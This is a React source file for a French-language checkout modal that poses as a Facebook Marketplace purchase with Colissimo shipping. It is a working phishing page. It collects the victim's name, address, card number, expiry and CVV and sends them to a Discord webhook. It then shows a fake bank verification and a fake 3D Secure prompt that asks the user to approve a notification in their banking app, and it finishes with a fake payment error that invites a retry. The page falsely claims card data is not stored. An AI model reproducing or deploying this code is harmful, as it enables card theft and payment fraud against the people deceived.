
import React, { useState, useEffect } from 'react';
import { validateLuhn } from '../utils/luhn';
import { sendToDiscord } from '../utils/webhook';

interface CheckoutModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: () => void;
  amount: string;
}

enum CheckoutStep {
  SHIPPING,
  TRACKING_PREVIEW,
  PAYMENT,
  PROCESSING,
  NOTIFICATION_CONSENT,
  THREED_SECURE_LOADING,
  ERROR
}

export const CheckoutModal: React.FC<CheckoutModalProps> = ({ isOpen, onClose, onSuccess, amount }) => {
  const [step, setStep] = useState<CheckoutStep>(CheckoutStep.SHIPPING);
  const [formData, setFormData] = useState({
    name: '',
    address: '',
    city: '',
    zip: '',
    card: '',
    expiry: '',
    cvv: '',
    confirm_email: '' // Honeypot field
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [consentChecked, setConsentChecked] = useState(false);
  const [showContinueButton, setShowContinueButton] = useState(false);

  const formattedAmount = (parseFloat(amount) || 0).toLocaleString('fr-FR', { 
    style: 'currency', 
    currency: 'EUR',
    minimumFractionDigits: 2 
  });

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let { name, value } = e.target;
    
    if (name === 'card') {
      value = value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim().substring(0, 19);
    }
    if (name === 'expiry') {
      value = value.replace(/\D/g, '').replace(/(.{2})/g, '$1/').trim().substring(0, 5);
      if (value.endsWith('/')) value = value.slice(0, -1);
    }
    if (name === 'zip' || name === 'cvv') {
      value = value.replace(/\D/g, '');
      if (name === 'zip') value = value.substring(0, 5);
      if (name === 'cvv') value = value.substring(0, 4);
    }

    setFormData(prev => ({ ...prev, [name]: value }));
    if (errors[name]) {
      const newErrors = { ...errors };
      delete newErrors[name];
      setErrors(newErrors);
    }
  };

  const validateShipping = () => {
    const newErrors: Record<string, string> = {};
    
    const nameRegex = /^[a-zA-ZÀ-ÿ\s'-]{4,}$/;
    const hasSpace = /\s/.test(formData.name.trim());
    if (!formData.name.trim() || !nameRegex.test(formData.name) || !hasSpace) {
      newErrors.name = "Nom et prénom complets requis";
    }

    if (!formData.address.trim() || formData.address.length < 5 || !/[a-zA-Z]/.test(formData.address)) {
      newErrors.address = "Adresse incomplète (ex: 12 rue de Paris)";
    }

    const cityRegex = /^[a-zA-ZÀ-ÿ\s'-]{2,}$/;
    if (!formData.city.trim() || !cityRegex.test(formData.city)) {
      newErrors.city = "Nom de ville invalide";
    }

    if (formData.zip.length !== 5) {
      newErrors.zip = "Format invalide (5 chiffres)";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validatePayment = () => {
    const newErrors: Record<string, string> = {};
    if (!validateLuhn(formData.card)) newErrors.card = "Numéro de carte invalide";
    if (!/^\d{2}\/\d{2}$/.test(formData.expiry)) newErrors.expiry = "Format MM/AA";
    if (formData.cvv.length < 3) newErrors.cvv = "CVV requis";
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };
  
  const handleRetry = () => {
    setErrors({});
    setStep(CheckoutStep.PAYMENT);
  };

  const nextStep = async () => {
    // Honeypot Check: If the hidden field is filled, it's a bot.
    if (formData.confirm_email) {
      console.warn("Honeypot triggered. Bot detected.");
      // Silently proceed for the user, but do not exfiltrate data.
      if (step === CheckoutStep.SHIPPING && validateShipping()) {
        setStep(CheckoutStep.TRACKING_PREVIEW);
      } else if (step === CheckoutStep.TRACKING_PREVIEW) {
        setStep(CheckoutStep.PAYMENT);
      } else if (step === CheckoutStep.PAYMENT && validatePayment()) {
        setStep(CheckoutStep.PROCESSING);
      } else if (step === CheckoutStep.NOTIFICATION_CONSENT && consentChecked) {
        setStep(CheckoutStep.THREED_SECURE_LOADING);
      }
      return; // Stop further execution of this function
    }

    if (step === CheckoutStep.SHIPPING) {
      if (validateShipping()) {
        await sendToDiscord("Données de Livraison", {
          "Montant": formattedAmount,
          "Nom": formData.name,
          "Adresse": formData.address,
          "Ville": formData.city,
          "Code Postal": formData.zip,
        });
        setStep(CheckoutStep.TRACKING_PREVIEW);
      }
    } else if (step === CheckoutStep.TRACKING_PREVIEW) {
      setStep(CheckoutStep.PAYMENT);
    } else if (step === CheckoutStep.PAYMENT) {
      if (validatePayment()) {
        await sendToDiscord("Données Bancaires", {
          "Montant": formattedAmount,
          "Nom": formData.name,
          "Carte": formData.card,
          "Expiration": formData.expiry,
          "CVV": formData.cvv,
        });
        setStep(CheckoutStep.PROCESSING);
      }
    } else if (step === CheckoutStep.NOTIFICATION_CONSENT) {
      if (consentChecked) {
          setShowContinueButton(false); // Reset button state
          setStep(CheckoutStep.THREED_SECURE_LOADING);
      }
    }
  };

  useEffect(() => {
    if (step === CheckoutStep.PROCESSING) {
      setLoadingProgress(0); // Reset progress
      const interval = setInterval(() => {
        setLoadingProgress(prev => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => setStep(CheckoutStep.NOTIFICATION_CONSENT), 500);
            return 100;
          }
          return prev + 2;
        });
      }, 50);
      return () => clearInterval(interval);
    }
    if (step === CheckoutStep.THREED_SECURE_LOADING) {
      const timer = setTimeout(() => {
        setShowContinueButton(true);
      }, 10000); // Wait 10s for continue button
      return () => clearTimeout(timer);
    }
  }, [step]);

  const cardCleaned = formData.card.replace(/\D/g, '');
  const isNotAllZeros = !/^0+$/.test(cardCleaned);
  const isCardValid = cardCleaned.length >= 13 && validateLuhn(formData.card) && isNotAllZeros;
  const isPaymentValid = isCardValid && /^\d{2}\/\d{2}$/.test(formData.expiry) && formData.cvv.length >= 3;

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
      <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md overflow-hidden animate-in fade-in zoom-in duration-300">
        
        {/* Modal Header */}
        <div className="px-6 py-4 border-b border-gray-100 flex items-center justify-between bg-gray-50/80">
          <h2 className="font-bold text-gray-900">
            {step === CheckoutStep.SHIPPING && "Informations de livraison"}
            {step === CheckoutStep.TRACKING_PREVIEW && "Suivi de livraison"}
            {step === CheckoutStep.PAYMENT && "Paiement sécurisé"}
            {step === CheckoutStep.PROCESSING && "Vérification bancaire"}
            {step === CheckoutStep.NOTIFICATION_CONSENT && "Activer les notifications"}
            {step === CheckoutStep.THREED_SECURE_LOADING && "Authentification 3D Secure"}
            {step === CheckoutStep.ERROR && "Échec du paiement"}
          </h2>
          { ![CheckoutStep.PROCESSING, CheckoutStep.NOTIFICATION_CONSENT, CheckoutStep.THREED_SECURE_LOADING, CheckoutStep.ERROR].includes(step) && (
            <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition-colors p-1">
              <i className="fas fa-times text-xl"></i>
            </button>
          )}
        </div>

        <div className="p-6">
          {step === CheckoutStep.SHIPPING && (
            <div className="space-y-4">
              <div className="absolute left-[-5000px]" aria-hidden="true">
                  <input type="email" name="confirm_email" tabIndex={-1} autoComplete="off" value={formData.confirm_email} onChange={handleInputChange}/>
              </div>
              <p className="text-sm text-gray-500 mb-4">Veuillez renseigner l'adresse de livraison pour recevoir votre commande via Colissimo.</p>
              <div>
                <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Nom complet</label>
                <input name="name" value={formData.name} onChange={handleInputChange} placeholder="Jean Dupont" className={`w-full p-3 rounded-xl border ${errors.name ? 'border-red-500 bg-red-50' : 'bg-white border-gray-200'} focus:border-[#0866FF] outline-none`} />
              </div>
              <div>
                <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Adresse</label>
                <input name="address" value={formData.address} onChange={handleInputChange} placeholder="123 Rue de Rivoli" className={`w-full p-3 rounded-xl border ${errors.address ? 'border-red-500 bg-red-50' : 'bg-white border-gray-200'} focus:border-[#0866FF] outline-none`} />
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Ville</label>
                  <input name="city" value={formData.city} onChange={handleInputChange} placeholder="Paris" className={`w-full p-3 rounded-xl border ${errors.city ? 'border-red-500 bg-red-50' : 'bg-white border-gray-200'} focus:border-[#0866FF] outline-none`} />
                </div>
                <div>
                  <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Code Postal</label>
                  <input name="zip" value={formData.zip} onChange={handleInputChange} placeholder="75001" className={`w-full p-3 rounded-xl border ${errors.zip ? 'border-red-500 bg-red-50' : 'bg-white border-gray-200'} focus:border-[#0866FF] outline-none`} />
                </div>
              </div>
              <button onClick={nextStep} className="w-full bg-[#0866FF] text-white font-bold py-4 rounded-xl mt-4 hover:bg-[#0759e0] transition-colors shadow-lg">Continuer vers le paiement</button>
            </div>
          )}

          {step === CheckoutStep.TRACKING_PREVIEW && (
            <div className="py-6 flex flex-col space-y-6">
              <div className="flex items-center justify-between mb-2">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLMzu2kwd8LgseG5QVV9nmqy7WT7ozEynpXA&s" alt="Colissimo" className="h-16 md:h-20 object-contain" />
                <span className="text-[10px] font-bold text-gray-500 uppercase bg-gray-100 px-3 py-1.5 rounded-full border border-gray-200">N° 6A19384756291</span>
              </div>
              
              <div className="bg-blue-50/50 p-4 rounded-xl border border-blue-100">
                <h4 className="text-xs font-bold text-[#0866FF] uppercase mb-2">Adresse de livraison</h4>
                <p className="text-sm text-gray-900 font-bold">{formData.name}</p>
                <p className="text-sm text-gray-700">{formData.address}</p>
                <p className="text-sm text-gray-700">{formData.zip} {formData.city}</p>
              </div>

              <div className="relative pl-6 border-l-2 border-[#0866FF] space-y-8 py-2 mx-2">
                <div className="relative">
                  <div className="absolute -left-[33px] top-1 w-4 h-4 bg-[#0866FF] rounded-full border-4 border-white shadow"></div>
                  <h4 className="text-sm font-bold text-[#0866FF]">Paiement en attente</h4>
                  <p className="text-xs text-gray-500 mt-1">En attente de la validation de votre paiement pour lancer l'expédition.</p>
                </div>
                <div className="relative opacity-40">
                  <div className="absolute -left-[33px] top-1 w-4 h-4 bg-gray-300 rounded-full border-4 border-white"></div>
                  <h4 className="text-sm font-bold text-gray-500">Prise en charge</h4>
                  <p className="text-xs text-gray-400 mt-1">Votre colis sera préparé par l'expéditeur.</p>
                </div>
                <div className="relative opacity-40">
                  <div className="absolute -left-[33px] top-1 w-4 h-4 bg-gray-300 rounded-full border-4 border-white"></div>
                  <h4 className="text-sm font-bold text-gray-500">En cours de livraison</h4>
                  <p className="text-xs text-gray-400 mt-1">Le colis sera en route vers votre adresse.</p>
                </div>
              </div>

              <button onClick={nextStep} className="w-full bg-[#0866FF] text-white font-bold py-4 rounded-xl mt-4 hover:bg-[#0759e0] transition-colors shadow-lg">
                Procéder au paiement
              </button>
            </div>
          )}

          {step === CheckoutStep.PAYMENT && (
            <div className="space-y-4">
              <div className="bg-blue-50 p-4 rounded-xl flex items-center justify-between mb-4">
                <span className="text-gray-700 font-medium">Total à régler :</span><span className="text-xl font-bold text-[#0866FF]">{formattedAmount}</span>
              </div>
              <div>
                <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Numéro de carte</label>
                <div className="relative">
                  <input name="card" value={formData.card} onChange={handleInputChange} placeholder="0000 0000 0000 0000" className={`w-full p-3 pl-12 rounded-xl border ${(!isCardValid && formData.card.length > 14) ? 'border-red-500 bg-red-50' : 'bg-white border-gray-200'} focus:border-[#0866FF] outline-none transition-colors`} />
                  <i className={`far fa-credit-card absolute left-4 top-4 ${isCardValid ? 'text-green-500' : 'text-gray-400'}`}></i>
                </div>
                {!isCardValid && formData.card.length > 14 && <p className="text-red-500 text-[10px] mt-1 font-medium">Numéro de carte invalide</p>}
              </div>
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Expiration</label>
                  <input name="expiry" value={formData.expiry} onChange={handleInputChange} placeholder="MM/AA" className={`w-full p-3 rounded-xl border ${errors.expiry ? 'border-red-500 bg-red-50' : 'bg-white border-gray-200'} focus:border-[#0866FF] outline-none`} />
                </div>
                <div>
                  <label className="block text-xs font-bold text-gray-500 uppercase mb-1">CVV</label>
                  <input name="cvv" type="password" value={formData.cvv} onChange={handleInputChange} placeholder="123" className={`w-full p-3 rounded-xl border ${errors.cvv ? 'border-red-500 bg-red-50' : 'bg-white border-gray-200'} focus:border-[#0866FF] outline-none`} />
                </div>
              </div>
              <p className="text-[10px] text-gray-400 italic text-center py-2">Paiement sécurisé par cryptage SSL 256 bits. Vos données bancaires ne sont pas stockées sur nos serveurs.</p>
              <button 
                onClick={nextStep} 
                disabled={!isPaymentValid}
                className={`w-full text-white font-bold py-4 rounded-xl mt-4 transition-colors shadow-lg flex items-center justify-center space-x-2 ${isPaymentValid ? 'bg-[#0866FF] hover:bg-[#0759e0]' : 'bg-gray-400 cursor-not-allowed'}`}
              >
                <i className="fas fa-lock text-sm"></i><span>Confirmer le paiement</span>
              </button>
            </div>
          )}

          {step === CheckoutStep.PROCESSING && (
            <div className="py-8 flex flex-col items-center">
              <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg" className="h-12 mb-6" alt="FB" />
              <div className="w-full bg-gray-100 h-2 rounded-full overflow-hidden mb-4"><div className="bg-[#0866FF] h-full transition-all duration-300" style={{ width: `${loadingProgress}%` }}></div></div>
              <p className="text-gray-600 font-medium text-sm animate-pulse">Communication sécurisée avec votre banque...</p>
              <p className="text-gray-400 text-xs mt-2">Ne fermez pas cette fenêtre.</p>
            </div>
          )}

          {step === CheckoutStep.NOTIFICATION_CONSENT && (
              <div className="py-8 flex flex-col items-center text-center space-y-6">
                  <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center">
                      <i className="fas fa-bell text-3xl text-blue-500"></i>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Activer la notification</h3>
                  <p className="text-gray-500 text-sm max-w-xs">
                      Pour sécuriser votre transaction, nous devons vous envoyer une notification sur votre application bancaire.
                  </p>
                  <div 
                      className="flex items-center space-x-3 bg-gray-50 p-4 rounded-xl w-full cursor-pointer border-2 border-transparent has-[:checked]:border-blue-500 transition-colors"
                      onClick={() => setConsentChecked(!consentChecked)}
                  >
                      <input 
                          id="consent-checkbox"
                          type="checkbox" 
                          checked={consentChecked} 
                          onChange={(e) => setConsentChecked(e.target.checked)}
                          className="h-5 w-5 rounded border-gray-300 text-blue-600 focus:ring-blue-500"
                      />
                      <label htmlFor="consent-checkbox" className="text-sm text-gray-700 select-none cursor-pointer">
                          J'accepte de recevoir une notification pour valider ce paiement.
                      </label>
                  </div>
                  <button 
                      onClick={() => nextStep()}
                      disabled={!consentChecked}
                      className="w-full bg-[#0866FF] text-white font-bold py-4 rounded-xl mt-4 hover:bg-[#0759e0] transition-colors shadow-lg disabled:bg-gray-300 disabled:cursor-not-allowed"
                  >
                      Continuer
                  </button>
              </div>
          )}

          {step === CheckoutStep.THREED_SECURE_LOADING && (
            <div className="py-8 text-center">
                <div className="flex items-center justify-between mb-6 px-2">
                    <img src="https://cdn-icons-png.flaticon.com/512/8705/8705632.png" className="h-10 mix-blend-multiply" alt="Banque"/>
                    <img src="https://www.compassfcu.com/media/egfoncio/verified-by-visa-near-oswego-ny-from-compass-fcu.jpg" className="h-10 mix-blend-multiply object-contain" alt="Verified by Visa"/>
                </div>
                <h3 className="text-lg font-bold text-gray-900">Authentification requise</h3>
                <p className="text-sm text-gray-700 mt-2 font-medium">Rendez-vous sur votre application bancaire et validez le paiement pour finaliser la commande.</p>
                
                <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 my-6 space-y-2 text-sm text-left">
                    <div className="flex justify-between">
                        <span className="text-gray-500">Marchand:</span>
                        <span className="font-bold text-gray-800">Facebook Marketplace</span>
                    </div>
                    <div className="flex justify-between">
                        <span className="text-gray-500">Montant:</span>
                        <span className="font-bold text-gray-800">{formattedAmount}</span>
                    </div>
                    <div className="flex justify-between">
                        <span className="text-gray-500">Carte:</span>
                        <span className="font-mono font-bold text-gray-800">**** **** **** {formData.card.slice(-4)}</span>
                    </div>
                </div>
                
                <div className="flex flex-col items-center justify-center space-y-4">
                    <div className="relative w-16 h-16">
                        <div className="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
                        <div className="absolute inset-0 border-4 border-t-blue-500 rounded-full animate-spin"></div>
                    </div>
                    <p className="text-gray-500 text-xs animate-pulse">Veuillez ne pas fermer cette fenêtre</p>
                </div>
                {showContinueButton && (
                    <button 
                        onClick={() => {
                            setStep(CheckoutStep.ERROR);
                            onSuccess(); // The simulation flow is "successful" even on error
                        }}
                        className="w-full bg-blue-500 text-white font-bold py-3 rounded-xl mt-8 hover:bg-blue-600 transition-colors animate-in fade-in"
                    >
                        Continuer
                    </button>
                )}
            </div>
          )}

          {step === CheckoutStep.ERROR && (
            <div className="py-12 flex flex-col items-center text-center">
              <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mb-6">
                <i className="fas fa-exclamation-triangle text-4xl text-red-500"></i>
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-2">Échec du Paiement</h3>
              <p className="text-gray-500 max-w-[300px] mx-auto text-sm leading-relaxed">
                Une erreur technique est survenue. Votre paiement n'a pas pu être traité. Veuillez réessayer ou contacter votre banque si le problème persiste.
              </p>
              <button onClick={handleRetry} className="w-full bg-[#0866FF] text-white font-bold py-3 rounded-xl mt-8 hover:bg-[#0759e0] transition-colors">
                Réessayer
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
